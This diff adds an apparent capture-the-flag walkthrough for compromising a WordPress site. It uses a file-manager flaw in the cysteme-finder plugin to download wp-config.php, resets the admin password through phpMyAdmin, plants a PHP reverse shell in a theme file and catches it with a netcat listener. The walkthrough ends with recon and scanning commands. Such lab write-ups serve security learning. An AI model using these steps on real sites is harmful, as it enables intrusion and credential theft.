@@ -1,0 +1,109 @@
+website: admin.breakthecode.com
+clue: the website has a plugin named cysteme-finder 
+task: exploit and find the file named Flag.txt and code out of it.
+
+
+procedure: 
+explored exploit-db and found https://www.exploit-db.com/exploits/40295
+
+1. get the root wordpress info as json using 
+   
+   http://admin.breakthecode.com/wp-content/plugins/cysteme-finder/php/connector.php?wphome=/var/www/html/wordpress&cmd=open&init=1&tree=1
+
+here wphome can change, so make sure you are using correct wphome.
+when we do /var/www/html/wordpress we get the wp-config.php and other pages details 
+where wp-config.php contains wordpress db credentials.
+
+2.  Download wp-config.php for getting user details to login to wp-config.php
+    http://admin.breakthecode.com/wp-content/plugins/cysteme-finder/php/connector.php?wphome=/var/www/html/wordpress&cmd=file&target=<wp-config.php base64>&download=1
+
+/var/www/html/wordpress/          ← "wphome" (filesystem root)
+├─ index.php
+├─ wp-config.php
+├─ .htaccess
+├─ wp-admin/
+├─ wp-includes/
+└─ wp-content/
+   ├─ plugins/
+   ├─ themes/
+   └─ uploads/
+
+3. Now, we can download the wp-config.php, once downloaded check the username and password details 
+4. Now, Go to the wordpress db page of the website, i.e phpadmin which contains db of the users on server.
+http://ip-of-admin-btc-com/phpmyadmin/
+
+
+5. go to the website directory and get any user details; in this case wpadmin. 
+update the password of wpadmin on the phpmyadmin 
+https://www.useotools.com/wordpress-password-hash-generator
+
+| Path (relative to site root) | Purpose                                                                     |
+| ---------------------------- | --------------------------------------------------------------------------- |
+| /wp-admin/                 | WordPress admin dashboard                                                   |
+| /wp-login.php              | Login page for WordPress                                                    |
+| /wp-register.php           | (older versions) User registration page                                     |
+| /wp-cron.php               | WordPress cron job trigger (can be abused for DDoS/DoS)                     |
+| /wp-config.php             | WordPress config file (should never be web-accessible)                      |
+| /wp-content/               | Themes, plugins, uploads                                                    |
+| /wp-includes/              | Core WordPress libraries                                                    |
+| /readme.html               | Default WordPress readme (reveals version)                                  |
+| /license.txt               | WordPress license (reveals version)                                         |
+| /xmlrpc.php                | Remote XML-RPC access (used for pingbacks, often exploited for brute force) |
+
+6. Now, go to the webssite login page. using wpadmin and password.
+
+7. to get Flag.txt file, you need to do a reverse shell. 
+8. after logging in you will get wp-content page
+└─ wp-content/
+   ├─ plugins/
+   ├─ themes/
+   └─ uploads/
+
+9. go to appearance -> theme editor.
+10. go to 2019 theme and archives 
+11. and paste the php reverse shell code in the page and update the file.
+12. Now, start a netcat listener on your local machine
+nc  -lvnp 4444
+
+13. Now access the page to trigger the reverse shell.
+http://admin.breakthecode.com/wp-content/themes/twentynineteen/archive.php    
+
+
+14. Now, you got nc shell on the server.
+15. locate Flag.txt and get content if its not permitted do privilege escalation using sudo -l.
+
+
+
+
+
+Notes: 
+for step1 to get the wphome try out the following
+
+# 1) Probe common WP endpoints (replace DOMAIN)
+curl -I https://DOMAIN/wp-login.php ; curl -I https://DOMAIN/wp-admin/ ; curl -I https://DOMAIN/readme.html
+
+# 2) Check robots/sitemap
+curl -sS https://DOMAIN/robots.txt | sed -n '1,120p'
+curl -sS https://DOMAIN/sitemap.xml | sed -n '1,120p'
+
+# 3) Fingerprint
+whatweb https://DOMAIN
+
+# 4) WPScan (needs API token for some checks)
+wpscan --url https://DOMAIN --enumerate vp,vt,tt,u
+
+# 5) Dir brute with gobuster (change wordlist path)
+gobuster dir -u https://DOMAIN -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40
+
+# 6) Dir brute with dirsearch (python)
+python3 ~/tools/dirsearch/dirsearch.py -u https://DOMAIN -e php,html,txt -w /usr/share/wordlists/dirb/common.txt
+
+# 7) Nikto quick scan
+nikto -h https://DOMAIN
+
+# 8) Google dork locally (use browser): site:DOMAIN inurl:wp- OR "Powered by WordPress"
+
+# If you have shell access (definitive):
+sudo find / -name wp-config.php 2>/dev/null        # locate WP install
+sudo find /var/www -name wp-config.php 2>/dev/null  # faster common path
+wp option get home --path=/path/to/wp               # using WP-CLI (requires path)
